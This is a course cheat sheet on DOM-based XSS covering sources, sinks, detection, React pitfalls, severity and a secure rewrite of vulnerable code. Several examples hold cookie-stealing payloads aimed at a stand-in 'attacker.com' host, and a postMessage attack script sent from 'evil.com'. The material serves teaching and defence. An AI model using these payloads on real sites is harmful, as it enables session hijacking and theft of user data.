# Module 4 — DOM XSS: Cheat Sheet & Field Reference

> **Scope:** Ethical hacking · Bug bounty · Secure coding · Defensive understanding  
> **Level:** Intermediate → Advanced  
> **Date:** 2026-05

---

## 1. Core Definition

DOM XSS occurs when client-side JavaScript reads attacker-controlled data from a **source** and writes it into a dangerous **sink** without sanitization. The server sends a perfectly clean response. The vulnerability exists entirely inside the browser.

```
Reflected:  Attacker → HTTP Request → Server (vulnerable) → Response → Browser
Stored:     Attacker → Database (vulnerable) → Server → Response → Browser
DOM XSS:    Attacker → Browser → JavaScript (vulnerable) → DOM → Browser
                                  ↑
                        Server is not involved at all
```

**Why this matters:**
- Server logs show nothing unusual
- WAFs never see the payload
- Server-side output encoding is completely irrelevant
- Network traffic looks perfectly clean
- The entire attack happens after the page loads

---

## 2. The Source → Sink Mental Model

```
SOURCE                    JAVASCRIPT               SINK
──────────────            ──────────────           ──────────────
location.hash      ──→   reads value        ──→   innerHTML
location.search    ──→   processes it       ──→   outerHTML
location.href      ──→   no sanitization    ──→   document.write()
document.URL       ──→                      ──→   eval()
document.referrer  ──→                      ──→   setTimeout(str)
postMessage        ──→                      ──→   location.href
localStorage       ──→                      ──→   element.src
sessionStorage     ──→                      ──→   element.setAttribute()
```

If attacker-controlled data flows from any source to any dangerous sink without sanitization — that is DOM XSS.

---

## 3. Sources — Full Reference

### `location.hash`
```javascript
// URL: https://site.com/page#hello
location.hash         // → "#hello"
location.hash.slice(1) // → "hello"  (most common usage)
```
**Why dangerous:** Never sent to the server. Fully attacker-controlled. Readable immediately on page load. WAFs and server logs never see it.

**Common vulnerable pattern:**
```javascript
const name = location.hash.slice(1);
document.getElementById('greeting').innerHTML = name;
// Crafted: page.html#<img src=x onerror=fetch('https://attacker.com/?c='+document.cookie)>
```

---

### `location.search`
```javascript
// URL: https://site.com/page?q=hello
location.search          // → "?q=hello"
new URLSearchParams(location.search).get('q')  // → "hello"
```
**Why dangerous:** Sent to the server, but the dangerous part is when JS reads it and passes it to a sink client-side — bypassing any server-side protections.

**Common vulnerable pattern:**
```javascript
const params = new URLSearchParams(location.search);
const query = params.get('q');
document.getElementById('results').innerHTML = 'Results for: ' + query;
```

---

### `document.URL` / `document.referrer`
```javascript
document.URL       // → full current URL as string
document.referrer  // → URL of the page that linked here
```
**Why dangerous:** Both are fully attacker-influenced. `document.referrer` is especially sneaky — it comes from the `Referer` header which an attacker controls by hosting a page that links to the target.

---

### `postMessage` / `e.data`
```javascript
window.addEventListener('message', (e) => {
  console.log(e.data);    // message content — attacker controlled
  console.log(e.origin);  // where it came from — MUST be validated
});
```
**Why dangerous:** Any window, tab, iframe, or popup can send a postMessage to any other. Without origin validation, an attacker page can send arbitrary data to the listener on the victim page.

**The cross-origin attack:**
```javascript
// evil.com sends a payload to victim.com
const target = window.open('https://victim.com/page');
setTimeout(() => {
  target.postMessage(
    '<img src=x onerror=fetch("https://attacker.com/?c="+document.cookie)>',
    '*'
  );
}, 2000);
```
Victim only needs to visit evil.com. No crafted victim.com URL needed. Address bar looks completely normal throughout.

---

### `localStorage` / `sessionStorage`
```javascript
localStorage.getItem('userData')    // attacker may have written here via prior XSS
sessionStorage.getItem('query')
```
**Why dangerous:** If an attacker previously injected data into storage via another XSS, that data persists and can trigger further execution. Also vulnerable when storage values are written from URL parameters and later read into sinks.

---

## 4. Sinks — Full Reference

### `innerHTML` / `outerHTML`
```javascript
element.innerHTML = userInput;   // parses as HTML — executes tags and events
element.outerHTML = userInput;   // same — replaces element entirely
```
**Why dangerous:** Passes input through the HTML parser. Any valid HTML tag, event handler, or script is executed.

**Fix:** Use `textContent` for text, `DOMPurify.sanitize()` for HTML.

---

### `document.write()` / `document.writeln()`
```javascript
document.write('<div>' + userInput + '</div>');
```
**Why dangerous:** Writes raw HTML into the document. If called after page load, can overwrite the entire DOM. No context awareness.

**Fix:** Never use `document.write()`. Use DOM APIs instead.

---

### `eval()`
```javascript
eval(userInput);                    // executes as JavaScript directly
eval('({' + userInput + '})');      // injection inside a JS expression
```
**Why dangerous:** Executes any JavaScript directly. No HTML parsing layer. Angle bracket filters (`<`, `>`) are completely irrelevant — payload is pure JS.

**Injection pattern for wrapped eval:**
```javascript
// Vulnerable:
eval('({ sort: ' + input + ' })');

// Payload: }); fetch('https://attacker.com/?c='+document.cookie);//
// eval receives:
eval('({ sort: }); fetch("https://attacker.com/?c="+document.cookie);//})')
// The }); closes the object, fetch executes, // comments out the remainder
```

**Fix:** Never pass user data to `eval()`. Use `JSON.parse()` for data, allowlists for config.

---

### `setTimeout()` / `setInterval()` with string argument
```javascript
setTimeout(userInput, 1000);      // string form — treated as eval
setInterval(userInput, 1000);     // same
```
**Why dangerous:** String arguments to `setTimeout`/`setInterval` are passed to the JS engine as code — functionally identical to `eval()`.

```javascript
// Safe — function reference, not a string
setTimeout(() => doSomething(), 1000);

// Dangerous — string is executed as code
setTimeout('doSomething(' + userInput + ')', 1000);
```

**Fix:** Always pass a function reference, never a string.

---

### `location.href` / `location.assign()` / `location.replace()`
```javascript
location.href = userInput;       // navigation sink
location.assign(userInput);      // same
location.replace(userInput);     // same
window.open(userInput);          // same
```
**Two attack paths:**
```javascript
// Path 1 — Open redirect (lower severity)
location.href = "https://evil.com"  // navigates away from victim site

// Path 2 — javascript: URI (DOM XSS — higher severity)
location.href = "javascript:fetch('https://attacker.com/?c='+document.cookie)"
// Executes JS in the current page's origin
```

**Fix:** Validate scheme before assigning:
```javascript
const redirect = location.hash.slice(1);
if (/^https?:\/\//i.test(redirect)) {
  location.href = redirect;   // safe — javascript: blocked
}
```

---

### `element.src` / `element.href` (on elements)
```javascript
scriptEl.src   = userInput;   // loads external script
iframeEl.src   = userInput;   // loads page in iframe
anchorEl.href  = userInput;   // accepts javascript: URI
```

---

## 5. `URLSearchParams` Does Not Sanitize

This is one of the most common developer misconceptions:

```javascript
// Developer thinks URLSearchParams makes it safe
const params = new URLSearchParams(location.search);
const query = params.get('q');
document.getElementById('results').innerHTML = query;  // STILL VULNERABLE
```

`URLSearchParams` parses structure — it separates keys from values. It does not encode, escape, or sanitize values. The value comes out of `.get()` exactly as it went in.

**Parsing and sanitizing are completely separate operations.** Same applies to `JSON.parse()`, `split()`, regex captures, and all other parsing functions.

---

## 6. `innerHTML` vs `textContent` vs `innerText`

| Property | Parses HTML? | XSS safe? | Notes |
|---|---|---|---|
| `innerHTML` | Yes | No | Full HTML parser — dangerous sink |
| `outerHTML` | Yes | No | Replaces element — dangerous sink |
| `textContent` | No | Yes | Raw text only — preferred safe sink |
| `innerText` | No | Yes | CSS-aware — skips hidden elements |
| `document.write()` | Yes | No | Writes raw HTML — never use |

**Prefer `textContent` over `innerText`** — faster, no layout reflow, more predictable. Both are safe for XSS purposes.

---

## 7. DOM-Safe Coding Patterns

### Never build HTML strings with user data
```javascript
// WRONG — HTML string with user data
element.innerHTML = `<h2>Results for: ${query}</h2>`;

// RIGHT — build the DOM directly
const h2 = document.createElement('h2');
h2.textContent = `Results for: ${query}`;
element.appendChild(h2);
```

### Never use eval for data parsing
```javascript
// WRONG
const config = eval('({' + userInput + '})');

// RIGHT — JSON for data
const config = JSON.parse(userInput);

// RIGHT — allowlist for config values
const ALLOWED = ['price', 'name', 'date'];
if (ALLOWED.includes(userInput)) applySort(userInput);
```

### Always validate origin in postMessage listeners
```javascript
// WRONG — accepts messages from any origin
window.addEventListener('message', (e) => {
  document.getElementById('out').innerHTML = e.data.content;
});

// RIGHT — two independent layers
const TRUSTED = 'https://trusted-partner.com';
window.addEventListener('message', (e) => {
  if (e.origin !== TRUSTED) return;                          // Layer 1 — origin check
  if (!e.data || e.data.type !== 'updateResults') return;   // Layer 2 — structure check
  document.getElementById('out').innerHTML =
    DOMPurify.sanitize(e.data.content);                     // Layer 3 — safe sink
});
```

### Always validate navigation sinks
```javascript
// WRONG
location.href = userInput;

// RIGHT
if (/^https?:\/\//i.test(userInput)) {
  location.href = userInput;
}
```

---

## 8. React DOM XSS Patterns

React auto-escapes JSX interpolation — but not everything:

```jsx
// SAFE — React escapes by default
function Profile({ username }) {
  return <div>{username}</div>;
}

// VULNERABLE — bypasses React's escaping entirely
function Profile({ username }) {
  return <div dangerouslySetInnerHTML={{ __html: username }} />;
}

// FIXED — sanitize before dangerouslySetInnerHTML
function Profile({ username }) {
  return <div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(username) }} />;
}

// VULNERABLE — javascript: URI in href
function Link({ url }) {
  return <a href={url}>Click</a>;   // url = "javascript:alert(1)" → XSS
}

// FIXED — validate scheme
function Link({ url }) {
  const safe = /^https?:\/\//i.test(url) ? url : '#';
  return <a href={safe}>Click</a>;
}
```

**The three React DOM XSS vectors:**
1. `dangerouslySetInnerHTML` without sanitization
2. `eval()` inside a component or hook
3. `href` / `src` receiving unvalidated user input

---

## 9. Detection Methodology

### Static analysis — code review
```
Search for every SOURCE:
  → location.hash
  → location.search
  → location.href / document.URL
  → document.referrer
  → postMessage / e.data / e.data.*
  → localStorage.getItem / sessionStorage.getItem

Search for every SINK:
  → .innerHTML = / .outerHTML =
  → document.write( / document.writeln(
  → eval(
  → setTimeout( / setInterval(   ← check if string argument
  → location.href = / location.assign( / location.replace(
  → window.open(
  → element.src = / element.href =
  → .setAttribute('href' / 'src' / 'action' / 'onX'

Trace data flow between sources and sinks:
  → Is there any sanitization between them?
  → Is there validation?
  → Can the sanitization be bypassed?
```

### Dynamic testing
```
1. Inject harmless probe into each source
   → page.html#domxsstest99999
   → page.html?q=domxsstest99999

2. Open browser devtools → Elements tab
   → Search DOM for domxsstest99999
   → If it appears in innerHTML — source flows to sink

3. Check browser console for errors
   → Syntax errors often reveal injection points in eval() sinks

4. Use browser devtools sources tab
   → Set breakpoints on dangerous sinks
   → Watch what values flow into them

5. For postMessage — use devtools event listeners
   → Inspect → Event Listeners → message
   → See what handler runs and what it does with e.data
```

---

## 10. Full Vulnerable Code → Secure Rewrite

### Vulnerable version
```html
<script>
  const params = new URLSearchParams(location.search);
  const query  = params.get('q');
  const sort   = params.get('sort');
  const debug  = params.get('debug');

  document.getElementById('banner').innerHTML = `<h2>Results for: ${query}</h2>`;

  if (sort) {
    const config = eval('({' + sort + '})');
    applySort(config);
  }

  if (debug === 'true') {
    document.getElementById('debug').innerHTML = 'Debug: q=' + query;
  }

  window.addEventListener('message', (e) => {
    if (e.data.type === 'updateResults') {
      document.getElementById('results').innerHTML = e.data.content;
    }
  });
</script>
```

### Secure version
```html
<script>
  const params = new URLSearchParams(location.search);
  const query  = params.get('q')    || '';
  const sort   = params.get('sort') || '';
  // debug parameter — removed entirely. Never ship debug modes to production.

  // ── Banner — textContent via createElement ──────────────────────────
  const h2 = document.createElement('h2');
  h2.textContent = `Results for: ${query}`;
  document.getElementById('banner').appendChild(h2);

  // ── Sort — allowlist validation, no eval ────────────────────────────
  const ALLOWED_FIELDS = ['price', 'name', 'rating', 'date'];
  const ALLOWED_ORDERS = ['asc', 'desc'];

  if (sort) {
    const [field, order] = sort.split(':');
    if (ALLOWED_FIELDS.includes(field) && ALLOWED_ORDERS.includes(order)) {
      applySort({ field, order });
    }
    // Invalid values silently ignored — never reflected, never eval'd
  }

  // ── postMessage — origin check + structure check + safe sink ────────
  const TRUSTED_ORIGIN = 'https://trusted-partner.com';

  window.addEventListener('message', (e) => {
    if (e.origin !== TRUSTED_ORIGIN) return;
    if (!e.data || e.data.type !== 'updateResults') return;
    document.getElementById('results').innerHTML =
      DOMPurify.sanitize(e.data.content);
  });
</script>
```

---

## 11. Severity Reference

| Vulnerability | Severity | Why |
|---|---|---|
| `eval()` via URL param | High | Direct JS execution, no HTML parser layer, filter-resistant |
| `postMessage` → `innerHTML` (no origin check) | High | Cross-origin, no crafted victim URL needed, invisible to victim |
| `innerHTML` via `location.hash` | High | No server involvement, clean logs, WAF bypass |
| `innerHTML` via `location.search` | High | Requires crafted link but full JS execution |
| `location.href` → `javascript:` URI | High | JS execution via navigation sink |
| `location.href` → open redirect only | Low–Medium | Navigation only — escalates with OAuth or phishing chain |
| Debug mode left in production | Medium | Reflects input, exposes internals, enables further attacks |

---

## 12. postMessage vs Reflected DOM XSS — Severity Comparison

```
Reflected DOM XSS (location.hash):
  ✗ Requires victim to click a crafted link
  ✗ Suspicious URL visible in address bar
  ✗ Attacker must deliver the URL via phishing

postMessage XSS (no origin check):
  ✓ Victim only needs to visit any attacker-controlled page
  ✓ victim.com URL looks completely normal throughout
  ✓ No interaction with victim.com required
  ✓ Attack is invisible at every step
  → Lead finding in bug bounty reports
```

---

## 13. Key Mental Models

> "The server sends nothing wrong. The vulnerability lives entirely in JavaScript running after page load."

> "Source is where attacker-controlled data enters the JS environment. Sink is where it gets executed or rendered."

> "Parsing is not sanitizing. URLSearchParams, JSON.parse, split() — none of these make data safe."

> "innerHTML is a HTML parser. textContent is a text inserter. When displaying user data, you almost always want textContent."

> "eval() makes angle bracket filters irrelevant. The payload is pure JavaScript — no tags needed."

> "postMessage without origin validation means any window on the internet can inject into your page."

> "Two layers for postMessage: validate origin AND use a safe sink. Neither alone is sufficient."

---

## 14. Coming Up — Module 5: Context, Encoding & Sanitization

- Why context determines everything about attack and defense
- HTML, JavaScript, URL, attribute, and CSS contexts unified
- Why the same input needs different encoding in different contexts
- How encoding works at the byte level
- Filter bypass thinking — conceptually and practically
- Trusted Types — the browser-native DOM XSS defense
- Why DOMPurify works where blocklists fail
- Full context decision tree for secure output